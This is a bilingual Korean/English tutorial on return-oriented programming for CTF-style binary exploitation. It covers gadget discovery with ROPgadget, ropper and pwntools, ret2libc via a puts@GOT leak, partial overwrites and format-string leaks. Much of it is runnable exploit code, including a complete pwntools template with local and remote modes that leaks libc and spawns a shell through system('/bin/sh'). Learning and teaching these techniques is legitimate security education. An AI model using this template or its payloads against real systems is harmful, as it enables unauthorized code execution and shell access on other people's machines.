> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# ROP(Return-Oriented Programming) 체인 구성

## 개요

현대 바이너리 익스플로잇에서 NX/DEP(실행 불가 메모리) 우회를 위해 ROP(Return-Oriented Programming)를 사용한다. 코드를 삽입하는 대신, 이미 실행 가능한 메모리 영역(바이너리, libc 등)에 존재하는 코드 조각(가젯)을 재활용한다.

---

## ROP 개념

### 가젯(Gadget)이란

`ret` 명령으로 끝나는 짧은 명령어 시퀀스:

```asm
; 가젯 예시 1: pop rdi; ret
58          pop rdi
c3          ret

; 가젯 예시 2: pop rsi; pop r15; ret
5e          pop rsi
41 5f       pop r15
c3          ret

; 가젯 예시 3: mov rax, rdi; ret
48 89 f8    mov rax, rdi
c3          ret
```

### ROP 체인 동작 원리

```
스택 레이아웃 (스택 오버플로 이후):
┌──────────────────┐
│  gadget1_addr    │  ← ret로 이 주소로 점프
│  gadget1_arg1    │  ← gadget1이 pop으로 읽음
│  gadget2_addr    │  ← gadget1의 ret로 이 주소로 점프
│  gadget2_arg1    │
│  gadget3_addr    │
│  ...             │
│  system_addr     │  ← 최종: system() 호출
│  "/bin/sh" addr  │  ← rdi = "/bin/sh"
└──────────────────┘
```

---

## 가젯 찾기

### ROPgadget

```bash
# 설치
pip install ropgadget

# 기본 가젯 탐색
ROPgadget --binary ./vuln_binary --rop

# 특정 가젯 검색
ROPgadget --binary ./vuln_binary --rop | grep "pop rdi"
ROPgadget --binary ./vuln_binary --rop | grep "pop rsi"

# libc에서 가젯 검색
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --rop | grep "pop rdi ; ret"

# ret2libc용 심볼 주소
ROPgadget --binary ./vuln_binary --rop --string "/bin/sh"

# 체인 자동 생성 시도
ROPgadget --binary ./vuln_binary --rop --chain "execve"
```

### ropper

```bash
# 설치
pip install ropper

# 가젯 검색
ropper --file ./vuln_binary --search "pop rdi"

# 배드 바이트 제외
ropper --file ./vuln_binary --search "pop rdi" --badbytes "00 0a 0d"

# 여러 파일 동시 검색
ropper --file ./vuln_binary --file /lib/x86_64-linux-gnu/libc.so.6
```

### pwntools에서 가젯 찾기

```python
from pwn import *

elf = ELF("./vuln_binary")
rop = ROP(elf)

# 자동 가젯 검색
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

print(f"pop rdi; ret = {hex(pop_rdi)}")
print(f"pop rsi; pop r15; ret = {hex(pop_rsi_r15)}")
```

---

## ret2libc 공격

### 1단계: 오프셋 확인

```python
from pwn import *

# cyclic 패턴으로 오프셋 찾기
context.binary = elf = ELF("./vuln_binary")
p = process("./vuln_binary")

# 패턴 생성 및 전송
pattern = cyclic(200)
p.sendline(pattern)
p.wait()

# core dump에서 오프셋 추출
core = Coredump("./core")
offset = cyclic_find(core.rsp)  # 또는 core.eip (32bit)
print(f"오프셋: {offset}")
```

### 2단계: libc 베이스 주소 leak (PIE 없는 경우)

```python
from pwn import *

context.binary = elf = ELF("./vuln_binary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(elf)

OFFSET = 72  # 위에서 찾은 오프셋

# PLT/GOT에서 libc 주소 leak
# puts(puts@got) → puts 실제 주소 출력
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret_gadget = rop.find_gadget(["ret"])[0]

payload = b"A" * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got["puts"])   # puts@GOT 주소
payload += p64(elf.plt["puts"])   # puts@PLT (실제 출력)
payload += p64(elf.symbols["main"])  # main으로 돌아가기

p = process("./vuln_binary")
p.sendline(payload)

# leak된 주소 읽기
leaked = u64(p.recv(6).ljust(8, b"\x00"))
print(f"puts 실제 주소: {hex(leaked)}")

libc.address = leaked - libc.symbols["puts"]
print(f"libc 베이스: {hex(libc.address)}")
```

### 3단계: 실제 셸 획득

```python
# libc 베이스로 system, /bin/sh 주소 계산
system_addr = libc.symbols["system"]
binsh_addr = next(libc.search(b"/bin/sh\x00"))
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret_gadget = rop.find_gadget(["ret"])[0]

print(f"system: {hex(system_addr)}")
print(f"/bin/sh: {hex(binsh_addr)}")

# 두 번째 페이로드: system("/bin/sh")
# 스택 정렬(16바이트)을 위해 ret 가젯 추가
payload2 = b"A" * OFFSET
payload2 += p64(ret_gadget)       # 스택 정렬
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)

p.sendline(payload2)
p.interactive()  # 셸 획득!
```

---

## ASLR + PIE 환경에서 ROP

ASLR: 라이브러리/스택 주소 랜덤화
PIE: 바이너리 자체도 랜덤화

### 방법 1: Partial Overwrite (주소 하위 바이트만 덮기)

```python
# ASLR 있어도 페이지 내 오프셋(하위 12비트)은 고정
# 널바이트 없이 낮은 바이트만 덮어서 특정 함수로 점프

payload = b"A" * OFFSET + b"\xd0\x17"  # 낮은 2바이트만 덮기
# 성공 확률: 1/16 (상위 4비트가 랜덤)
```

### 방법 2: Format String으로 주소 leak

```python
from pwn import *

p = process("./format_vuln")

# %p 체인으로 스택에서 주소 leak
p.sendline(b"%p " * 20)
output = p.recv().decode()

# 스택에서 PIE 베이스 또는 libc 주소 추출
addrs = [int(x, 16) for x in output.split() if x.startswith("0x")]
for addr in addrs:
    print(hex(addr))
```

---

## 완전한 pwntools ROP 익스플로잇

```python
#!/usr/bin/env python3
"""
ROP Chain Exploit Template
사용법: python3 rop_exploit.py [LOCAL|REMOTE] [host] [port]
"""

import argparse
import sys
from pwn import *


def get_target(args: argparse.Namespace) -> process | remote:
    if args.mode == "remote":
        return remote(args.host, args.port)
    return process(args.binary)


def leak_libc(p: tube, elf: ELF, rop: ROP, offset: int) -> int:
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret_gadget = rop.find_gadget(["ret"])[0]

    payload = flat(
        b"A" * offset,
        pop_rdi,
        elf.got["puts"],
        elf.plt["puts"],
        elf.symbols["main"],
    )

    p.sendlineafter(b"Input: ", payload)

    # 6바이트 주소 읽기 (x64 리틀엔디언)
    leaked_bytes = p.recvline().strip()
    leaked_addr = u64(leaked_bytes.ljust(8, b"\x00"))
    return leaked_addr


def get_shell(p: tube, libc: ELF, rop: ROP, offset: int) -> None:
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret_gadget = rop.find_gadget(["ret"])[0]

    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols["system"]

    payload = flat(
        b"A" * offset,
        ret_gadget,   # 스택 16바이트 정렬
        pop_rdi,
        binsh,
        system,
    )

    p.sendlineafter(b"Input: ", payload)
    p.interactive()


def main() -> None:
    parser = argparse.ArgumentParser(description="ROP Chain Exploit")
    parser.add_argument("--binary", default="./vuln", help="바이너리 경로")
    parser.add_argument("--libc", default="/lib/x86_64-linux-gnu/libc.so.6")
    parser.add_argument("--offset", type=int, required=True, help="BOF 오프셋")
    parser.add_argument("--mode", choices=["local", "remote"], default="local")
    parser.add_argument("--host", default="localhost")
    parser.add_argument("--port", type=int, default=1337)

    args = parser.parse_args()

    context.binary = elf = ELF(args.binary)
    libc = ELF(args.libc)
    rop = ROP(elf)

    context.log_level = "info"

    p = get_target(args)

    # 1단계: libc 주소 leak
    log.info("1단계: libc 주소 leak")
    leaked_puts = leak_libc(p, elf, rop, args.offset)
    log.success(f"puts 주소: {hex(leaked_puts)}")

    libc.address = leaked_puts - libc.symbols["puts"]
    log.success(f"libc 베이스: {hex(libc.address)}")

    # 2단계: 셸 획득
    log.info("2단계: 셸 획득")
    get_shell(p, libc, rop, args.offset)


if __name__ == "__main__":
    main()
```

---

## CTF 실전 팁

### 디버깅

```python
# GDB 자동 연결
p = gdb.debug("./vuln", gdbscript="""
    break *main+150
    continue
""")

# ROP 가젯 주소 확인
context.log_level = "debug"
```

### 흔한 실수 및 해결법

| 문제 | 원인 | 해결 |
|------|------|------|
| Segfault at movaps | 스택 16바이트 정렬 실패 | `ret` 가젯 1개 추가 |
| puts가 짧게 읽힘 | `\x0a` 개행 문자로 끊김 | `recvuntil`, `recvline` 조합 |
| 주소에 null 바이트 | `\x00` 전달 불가 | PLT leak으로 우회 |
| ASLR bypass 실패 | 브루트포스 필요 | fork 서버 환경 활용 |

---

<a name="english"></a>

# ROP (Return-Oriented Programming) Chain Construction

## Overview

In modern binary exploitation, ROP (Return-Oriented Programming) is used to bypass NX/DEP (Non-Executable memory). Instead of injecting code, it reuses existing code snippets (gadgets) already present in executable memory regions (binary, libc, etc.).

```
Traditional Shellcode:
  Overflow → Inject shellcode → Execute
  Blocked by: NX/DEP

ROP Chain:
  Overflow → Chain existing code gadgets → Execute system("/bin/sh")
  Bypasses: NX/DEP (using existing executable code)
  Still blocked by: ASLR (need address leak)
```

---

## 1. Finding ROP Gadgets

```bash
# ROPgadget
ROPgadget --binary ./vuln | grep "pop rdi"
ROPgadget --binary ./vuln | grep ": ret$"
ROPgadget --binary ./vuln --rop --badbytes "0a00"

# ropper
ropper -f ./vuln --search "pop rdi"
ropper -f ./vuln --chain execve

# pwntools built-in
from pwn import ROP, ELF
elf = ELF('./vuln')
rop = ROP(elf)
rop.find_gadget(['pop rdi', 'ret'])
```

---

## 2. ret2plt — Call Library Functions

```python
from pwn import *

binary = ELF('./vuln')
libc = ELF('./libc.so.6')

def exploit():
    p = process('./vuln')
    
    # Find gadgets
    rop = ROP(binary)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret_gadget = rop.find_gadget(['ret'])[0]  # Stack alignment
    
    # Build ROP chain
    payload = b'A' * offset          # Fill to return address
    payload += p64(pop_rdi)          # pop rdi; ret
    payload += p64(next(binary.search(b'/bin/sh\x00')))  # "/bin/sh" address
    payload += p64(ret_gadget)       # Stack alignment (16-byte)
    payload += p64(binary.plt['system'])  # system()
    
    p.sendline(payload)
    p.interactive()
```

---

## 3. ret2libc — ASLR Bypass

```python
from pwn import *

binary = ELF('./vuln')
libc = ELF('./libc.so.6')

def leak_libc(p, payload_gen):
    """Leak libc address via puts/printf"""
    
    rop = ROP(binary)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    
    # Leak puts address
    leak_payload = b'A' * offset
    leak_payload += p64(pop_rdi)
    leak_payload += p64(binary.got['puts'])  # Address of puts in GOT
    leak_payload += p64(binary.plt['puts'])  # Call puts to print the address
    leak_payload += p64(binary.symbols['main'])  # Return to main for second exploit
    
    p.sendline(leak_payload)
    p.recvuntil(b'\n')
    
    # Parse leaked address
    leaked = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = leaked - libc.symbols['puts']
    
    print(f"[+] libc base: {hex(libc_base)}")
    return libc_base

def exploit():
    p = process('./vuln')
    
    libc_base = leak_libc(p, None)
    
    # Calculate actual addresses
    system = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    
    rop = ROP(binary)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret_gadget = rop.find_gadget(['ret'])[0]
    
    # Second payload: call system("/bin/sh")
    final_payload = b'A' * offset
    final_payload += p64(pop_rdi)
    final_payload += p64(bin_sh)
    final_payload += p64(ret_gadget)
    final_payload += p64(system)
    
    p.sendline(final_payload)
    p.interactive()
```

---

## 4. Common Issues and Solutions

| Issue | Cause | Solution |
|-------|-------|---------|
| Segfault at movaps | Stack not 16-byte aligned | Add one extra `ret` gadget |
| puts truncated | `\x0a` newline character cuts off | Use `recvuntil`, `recvline` combination |
| Null bytes in address | Cannot pass `\x00` | Bypass via PLT leak |
| ASLR bypass fails | Brute force needed | Utilize fork server environment |
